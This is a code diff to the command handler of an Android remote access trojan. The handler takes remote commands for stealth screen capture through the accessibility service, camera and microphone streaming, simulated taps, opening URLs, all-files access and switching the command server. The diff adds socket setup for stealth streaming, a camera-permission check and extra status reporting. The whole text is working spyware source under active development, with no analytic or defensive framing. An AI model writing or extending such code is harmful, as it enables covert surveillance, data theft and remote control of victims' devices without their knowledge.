@@ -54,6 +54,7 @@ public final class CommandHandler {
                 case "screen_stop": ScreenStreamer.getInstance().stop("screen"); r.addProperty("ok", true); break;
                 case "screen_stealth":
                     if (RatAccessibilityService.INSTANCE != null) {
+                        ScreenStreamer.getInstance().ensureSocket("screen");
                         RatAccessibilityService.INSTANCE.startShotStream();
                         r.addProperty("ok", "a11y-shot-stream");
                     } else r.addProperty("err", "a11y off");
@@ -61,7 +62,15 @@ public final class CommandHandler {
                 case "screen_stealth_stop":
                     if (RatAccessibilityService.INSTANCE != null) RatAccessibilityService.INSTANCE.stopShotStream();
                     r.addProperty("ok", true); break;
-                case "cam": ScreenStreamer.getInstance().start(app, "cam", s(args, "facing", "front")); r.addProperty("ok", true); break;
+                case "cam": {
+                    if (app.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                        r.addProperty("err", "camera permission denied");
+                        break;
+                    }
+                    ScreenStreamer.getInstance().start(app, "cam", s(args, "facing", "front"));
+                    r.addProperty("ok", true);
+                    break;
+                }
                 case "cam_stop": ScreenStreamer.getInstance().stop("cam"); r.addProperty("ok", true); break;
                 case "mic_start": case "mic": ScreenStreamer.getInstance().start(app, "mic", null); r.addProperty("ok", true); break;
                 case "mic_stop": ScreenStreamer.getInstance().stop("mic"); r.addProperty("ok", true); break;
@@ -97,7 +106,10 @@ public final class CommandHandler {
                 case "long_press": doLongPress(args, r); break;
                 case "open_url": doOpenUrl(app, s(args, "url", "")); r.addProperty("ok", true); break;
                 case "all_files_access": doAllFiles(app); r.addProperty("ok", true); break;
-                case "a11y_status": r.addProperty("up", RatAccessibilityService.isUp()); break;
+                case "a11y_status":
+                    r.addProperty("up", RatAccessibilityService.isUp());
+                    r.addProperty("lanes", ShotLaneService.laneCount());
+                    break;
                 case "info": doInfo(app, r); break;
                 case "server": r.addProperty("server", Net.base()); break;
                 case "set_server": {
@@ -572,6 +584,7 @@ public final class CommandHandler {
         r.addProperty("network", Net.networkType(app));
         r.addProperty("sim", Net.simLabel(app));
         r.addProperty("a11y", RatAccessibilityService.isUp());
+        r.addProperty("lanes", ShotLaneService.laneCount());
         r.addProperty("admin", isAdmin(app));
         r.addProperty("screen", ScreenStreamer.getInstance().anyActive());
         ActivityManager am = (ActivityManager) app.getSystemService(Context.ACTIVITY_SERVICE);
